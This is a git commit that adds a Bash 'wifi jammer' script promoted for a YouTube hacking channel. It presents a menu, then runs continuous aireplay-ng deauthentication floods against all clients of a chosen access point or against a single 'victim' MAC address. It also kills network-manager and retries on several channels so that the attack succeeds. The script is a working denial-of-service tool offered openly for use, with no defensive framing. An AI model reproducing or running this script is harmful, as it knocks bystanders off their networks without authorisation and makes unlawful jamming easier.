e74a089c9c47a072a856958cd6d6db783f838fb2
manjitsaha <manjitsaha01@gmail.com>
2018-04-13 23:11:21 +0530

    Add files via upload
    v2

---
+++ wifijammer.sh
@@ -0,0 +1,436 @@
+#!/bin/bash 
+
+
+echo "__          _______ ______ _____        _         __  __ __  __ ______ _____  "
+sleep 0.3
+echo "\ \        / /_   _|  ____|_   _|      | |  /\   |  \/  |  \/  |  ____|  __ \ "
+sleep 0.3
+echo " \ \  /\  / /  | | | |__    | |        | | /  \  | \  / | \  / | |__  | |__) |"
+sleep 0.3
+echo "  \ \/  \/ /   | | |  __|   | |    _   | |/ /\ \ | |\/| | |\/| |  __| |  _  / "
+sleep 0.3
+echo "   \  /\  /   _| |_| |     _| |_  | |__| / ____ \| |  | | |  | | |____| | \ \ "
+sleep 0.3
+echo "    \/  \/   |_____|_|    |_____|  \____/_/    \_\_|  |_|_|  |_|______|_|  \_\""
+sleep 0.2
+echo ""
+echo ""
+echo ""                                                                            
+                                                                              
+echo "*********************** THANKS FOR USING MY TOOL **************************"
+sleep 0.2
+
+echo " "
+echo " "
+echo "************************** GIVE A THUMBS UP ****************************** "
+echo " "
+echo " "
+sleep 0.2
+echo "                  COMMENT DOWN IF YOU HAVE ANY PROBLEM                     "
+echo " "
+echo " "
+echo " "
+sleep 0.2
+echo "Script Written BY :::::::::------- "
+echo " "
+echo " _  __    _    _   _     _ ___ _____   ____    _    _   _    _  "  
+echo "|  \/  |  / \  | \ | |   | |_ _|_   _| / ___|  / \  | | | |  / \ "  
+echo "| |\/| | / _ \ |  \| |_  | || |  | |   \___ \ / _ \ | |_| | / _ \ " 
+echo "| |  | |/ ___ \| |\  | |_| || |  | |    ___) / ___ \|  _  |/ ___ \ "
+echo "|_|  |_/_/   \_\_| \_|\___/|___| |_|   |____/_/   \_\_| |_/_/   \_\""
+echo " "
+echo " "
+echo " "
+echo " Subscribe My Youtube Channel -- hackandenjoy"
+echo " "
+echo " "
+sleep 2
+clear
+
+MAC=airodump-ng wlan0
+function wj(){
+ 
+echo "__          _______ ______ _____        _         __  __ __  __ ______ _____  "
+echo "\ \        / /_   _|  ____|_   _|      | |  /\   |  \/  |  \/  |  ____|  __ \ "
+echo " \ \  /\  / /  | | | |__    | |        | | /  \  | \  / | \  / | |__  | |__) |"
+echo "  \ \/  \/ /   | | |  __|   | |    _   | |/ /\ \ | |\/| | |\/| |  __| |  _  / "
+echo "   \  /\  /   _| |_| |     _| |_  | |__| / ____ \| |  | | |  | | |____| | \ \ "
+echo "    \/  \/   |_____|_|    |_____|  \____/_/    \_\_|  |_|_|  |_|______|_|  \_\""
+echo ""
+echo "----x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x---"
+echo " "
+echo " "
+echo " Subscribe My Youtube Channel -- hackandenjoy"
+echo " "
+echo " "
+echo ""
+echo "   1. F*ck The Wifi "
+echo "   2. Help"
+echo "   3. Exit"    
+echo ""
+echo ""
+echo "" 
+}
+wj
+while true
+do
+read -p ":~# " MENU
+if [ $MENU -eq 1 ]
+then
+clear
+
+echo "__          _______ ______ _____        _         __  __ __  __ ______ _____  "
+echo "\ \        / /_   _|  ____|_   _|      | |  /\   |  \/  |  \/  |  ____|  __ \ "
+echo " \ \  /\  / /  | | | |__    | |        | | /  \  | \  / | \  / | |__  | |__) |"
+echo "  \ \/  \/ /   | | |  __|   | |    _   | |/ /\ \ | |\/| | |\/| |  __| |  _  / "
+echo "   \  /\  /   _| |_| |     _| |_  | |__| / ____ \| |  | | |  | | |____| | \ \ "
+echo "    \/  \/   |_____|_|    |_____|  \____/_/    \_\_|  |_|_|  |_|______|_|  \_\""
+echo ""
+echo "----x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x---"
+echo " "
+echo " "
+echo " Subscribe My Youtube Channel -- hackandenjoy"
+echo " "
+echo " "
+echo "    1. Jam All Devices"
+echo "    2. Jam A Target Device"
+echo "    3. Back"
+echo "    4. Exit"
+echo ""
+echo ""
+read -p ":~# " JAM
+if [ $JAM -eq 1 ]
+then
+clear
+echo "__          _______ ______ _____        _         __  __ __  __ ______ _____  "
+echo "\ \        / /_   _|  ____|_   _|      | |  /\   |  \/  |  \/  |  ____|  __ \ "
+echo " \ \  /\  / /  | | | |__    | |        | | /  \  | \  / | \  / | |__  | |__) |"
+echo "  \ \/  \/ /   | | |  __|   | |    _   | |/ /\ \ | |\/| | |\/| |  __| |  _  / "
+echo "   \  /\  /   _| |_| |     _| |_  | |__| / ____ \| |  | | |  | | |____| | \ \ "
+echo "    \/  \/   |_____|_|    |_____|  \____/_/    \_\_|  |_|_|  |_|______|_|  \_\""
+echo ""
+echo "----x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x---"
+echo ""
+echo ""
+echo " Subscribe My Youtube Channel -- hackandenjoy"
+echo " "
+echo " "
+echo "" 
+echo "Enter 0 To Go Back OR Press ctrl+c To Exit"
+echo ""
+echo ""
+read -p "Enter Target Wifi AP Name: " MAN
+if [ $MAN -eq 0 ]
+then
+wj
+else
+clear
+echo "__          _______ ______ _____        _         __  __ __  __ ______ _____  "
+echo "\ \        / /_   _|  ____|_   _|      | |  /\   |  \/  |  \/  |  ____|  __ \ "
+echo " \ \  /\  / /  | | | |__    | |        | | /  \  | \  / | \  / | |__  | |__) |"
+echo "  \ \/  \/ /   | | |  __|   | |    _   | |/ /\ \ | |\/| | |\/| |  __| |  _  / "
+echo "   \  /\  /   _| |_| |     _| |_  | |__| / ____ \| |  | | |  | | |____| | \ \ "
+echo "    \/  \/   |_____|_|    |_____|  \____/_/    \_\_|  |_|_|  |_|______|_|  \_\""
+echo ""
+echo "----x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x---"
+echo " "
+echo " Subscribe My Youtube Channel -- hackandenjoy"
+echo " "
+echo " "
+aireplay-ng -0 0 -e "${MAN}" wlan0
+if [ $? -ne 0 ]
+then
+echo ""
+echo ""
+echo "If It Is Giving An Error Wifi Is on Channel No.{(example -(10)} and AP Is On Channel No.{(example - 6)}."
+echo ""
+echo "Maybe You Will Get Another No. That I Am Given Above As Example."
+echo ""
+echo "It's Totally Okay Go Ahead And Enjoy Hacking "
+sleep 1
+echo ""
+echo "Then Enter The AP Channel No.{(((IN THIS CASE AP CHANNEL NO. IS:-6 SO ENTER 6)))} OR, "
+echo ""
+echo "If You Are Getting Another Error, Just Hit Enter It Will Be Get Fixed Automatic: "
+echo ""
+echo ""
+echo "Wait 9 seconds...."
+service network-manager stop
+sleep 3
+service network-manager start
+echo ""
+sleep 3
+read -p "Enter Channel No.: " CHAN
+iwconfig wlan0 channel $CHAN
+{airmon-ng check kill}&> /dev/null
+echo " "
+iwconfig wlan0 channel $CHAN
+aireplay-ng -0 0 -e "${MAN}" wlan0
+fi
+if [ $? -ne 0 ]
+then
+echo ""
+echo ""
+echo "Well, This Is The Last Attempt"
+sleep 0.2
+echo ""
+echo "Surely, Your Wifi Adapter Is Hopping. "
+echo ""
+sleep 0.2
+echo "If You Are Keep Getting Error bssid Not Found OR Any Other."
+echo ""
+sleep 0.2
+echo "Just Restart Your Computer ;)"
+echo ""
+sleep 0.2
+echo "Restarting Will Make Your Adapter Hopping Stop. :)"
+echo ""
+sleep 0.2
+echo "   Happy Hacking   "
+echo ""
+sleep 0.2
+echo "IF THIS IS CHANNEL No. PROBLEM ENTER CHANNEL No. OR JUST PRESS ENTER"
+echo ""
+echo ""
+
+airmon-ng check kill
+read -p "Enter Channel No. : " KEN
+iwconfig wlan0 channel $KEN
+aireplay-ng -0 0 -e "${MAN}" wlan0
+fi
+service network-manager stop
+service network-manager start
+read -p "Enter Channel No. : " WIN
+iwconfig wlan0 channel $WIN
+aireplay-ng -0 0 -e "${MAN}" wlan0
+
+echo ""
+echo ""
+echo "***************** SORRY, BECAUSE IT DIDN'T WORKED OUT ********************"
+
+echo " "
+echo " "
+echo "********************* THANKS FOR USING MY SCRIPT ************************ "
+echo " "
+echo " "
+echo "********************* Just Restart Your Computer. It Will Work Surely ;) ***********************" 
+echo " "
+echo " "
+echo "                   COMMENT DOWN IF YOU HAVE ANY PROBLEM                    "
+echo " " 
+echo " "
+echo " "
+echo " _  __    _    _   _     _ ___ _____   ____    _    _   _    _  "  
+echo "|  \/  |  / \  | \ | |   | |_ _|_   _| / ___|  / \  | | | |  / \ "  
+echo "| |\/| | / _ \ |  \| |_  | || |  | |   \___ \ / _ \ | |_| | / _ \ " 
+echo "| |  | |/ ___ \| |\  | |_| || |  | |    ___) / ___ \|  _  |/ ___ \ "
+echo "|_|  |_/_/   \_\_| \_|\___/|___| |_|   |____/_/   \_\_| |_/_/   \_\""
+fi
+elif [ $JAM -eq 2 ]
+then
+clear
+echo "__          _______ ______ _____        _         __  __ __  __ ______ _____  "
+echo "\ \        / /_   _|  ____|_   _|      | |  /\   |  \/  |  \/  |  ____|  __ \ "
+echo " \ \  /\  / /  | | | |__    | |        | | /  \  | \  / | \  / | |__  | |__) |"
+echo "  \ \/  \/ /   | | |  __|   | |    _   | |/ /\ \ | |\/| | |\/| |  __| |  _  / "
+echo "   \  /\  /   _| |_| |     _| |_  | |__| / ____ \| |  | | |  | | |____| | \ \ "
+echo "    \/  \/   |_____|_|    |_____|  \____/_/    \_\_|  |_|_|  |_|______|_|  \_\""
+echo ""
+echo "----x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x---"
+echo ""
+echo ""
+echo "Enter 0 To Go Back OR Press ctrl+c To Exit"
+echo ""
+echo ""
+
+read -p "Victim MAC Address: " CLIENT
+if [ $CLIENT = 0 ]
+then
+clear
+wj
+else
+read -p "Enter Target Wifi AP Name: " FUCK
+aireplay-ng --deauth 0 -c $CLIENT -e $FUCK wlan0
+if [ $? -ne 0 ]
+then
+echo ""
+echo ""
+echo "If It Is Giving An Error Wifi Is on Channel No.{(example -(10)} and AP Is On Channel No.{(example - 6)}."
+echo ""
+echo "Maybe You Will Get Another No. That I Am Given Above As Example."
+echo ""
+echo "It's Totally Okay Go Ahead And Enjoy Hacking "
+sleep 1
+echo ""
+echo "Then Enter The AP Channel No.{(((IN THIS CASE AP CHANNEL NO. IS:-6 SO ENTER 6)))} OR, "
+echo ""
+echo "If You Are Getting Another Error, Just Hit Enter It Will Be Get Fixed Automatic: "
+echo ""
+echo ""
+echo "Wait 9 seconds...."
+service network-manager stop
+sleep 3
+service network-manager start
+echo ""
+sleep 3
+read -p "Enter Channel No.: " CHAN
+iwconfig wlan0 channel $CHAN
+{airmon-ng check kill}&> /dev/null
+echo " "
+iwconfig wlan0 channel $CHAN
+aireplay-ng --deauth 0 -c $CLIENT -e $FUCK wlan0
+fi
+if [ $? -ne 0 ]
+then
+echo ""
+echo ""
+echo "Well, This Is The Last Attempt"
+sleep 0.2
+echo ""
+echo "Surely, Your Wifi Adapter Is Hopping. "
+echo ""
+sleep 0.2
+echo "If You Are Keep Getting Error bssid Not Found OR Any Other."
+echo ""
+sleep 0.2
+echo "Just Restart Your Computer ;)"
+echo ""
+sleep 0.2
+echo "Restarting Will Make Your Adapter Hopping Stop. :)"
+echo ""
+sleep 0.2
+echo "   Happy Hacking   "
+echo ""
+sleep 0.2
+echo "IF THIS IS CHANNEL No. PROBLEM ENTER CHANNEL No. OR JUST PRESS ENTER"
+echo ""
+echo ""
+airmon-ng check kill
+read -p "Enter Channel No. : " KEN
+iwconfig wlan0 channel $KEN
+aireplay-ng --deauth 0 -c $CLIENT -e $FUCK wlan0
+fi
+service network-manager stop
+service network-manager start
+read -p "Enter Channel No. : " WIN
+iwconfig wlan0 channel $WIN
+aireplay-ng --deauth 0 -c $CLIENT -e $FUCK wlan0
+echo ""
+echo ""
+echo "***************** SORRY, BECAUSE IT DIDN'T WORKED OUT ********************"
+
+echo " "
+echo " "
+echo "********************* THANKS FOR USING MY SCRIPT ************************ "
+echo " "
+echo " "
+echo "********************* Just Restart Your Computer. It Will Work Surely ;) ***********************" 
+echo " "
+echo " "
+echo "                   COMMENT DOWN IF YOU HAVE ANY PROBLEM                    "
+echo " " 
+echo " "
+echo " "
+echo " _  __    _    _   _     _ ___ _____   ____    _    _   _    _  "  
+echo "|  \/  |  / \  | \ | |   | |_ _|_   _| / ___|  / \  | | | |  / \ "  
+echo "| |\/| | / _ \ |  \| |_  | || |  | |   \___ \ / _ \ | |_| | / _ \ " 
+echo "| |  | |/ ___ \| |\  | |_| || |  | |    ___) / ___ \|  _  |/ ___ \ "
+echo "|_|  |_/_/   \_\_| \_|\___/|___| |_|   |____/_/   \_\_| |_/_/   \_\""
+fi
+elif [ $JAM -eq 3 ]
+then
+clear
+wj
+elif [ $JAM -eq 4 ]
+then
+exit
+
+fi
+elif [ $MENU -eq 2 ]
+then
+clear
+echo "__          _______ ______ _____        _         __  __ __  __ ______ _____  "
+echo "\ \        / /_   _|  ____|_   _|      | |  /\   |  \/  |  \/  |  ____|  __ \ "
+echo " \ \  /\  / /  | | | |__    | |        | | /  \  | \  / | \  / | |__  | |__) |"
+echo "  \ \/  \/ /   | | |  __|   | |    _   | |/ /\ \ | |\/| | |\/| |  __| |  _  / "
+echo "   \  /\  /   _| |_| |     _| |_  | |__| / ____ \| |  | | |  | | |____| | \ \ "
+echo "    \/  \/   |_____|_|    |_____|  \____/_/    \_\_|  |_|_|  |_|______|_|  \_\""
+echo ""
+echo "----x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x---"
+echo ""
+echo ""
+echo ""
+echo "  If You Got Any Problem Then Feel Free To Mail Me"
+echo " "
+echo "  comeonmailmee@gmail.com"
+echo ""
+echo "  Subscribe To My YouTube Channel :- hackandenjoy"
+echo ""
+echo "  Press 0 To Go Back"
+echo ""
+echo ""
+read -p ":~# " BACK
+if [ $BACK -eq 0 ]
+then
+clear
+wj
+
+fi
+
+elif [ $MENU -eq 3 ]
+then 
+exit
+fi
+done
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
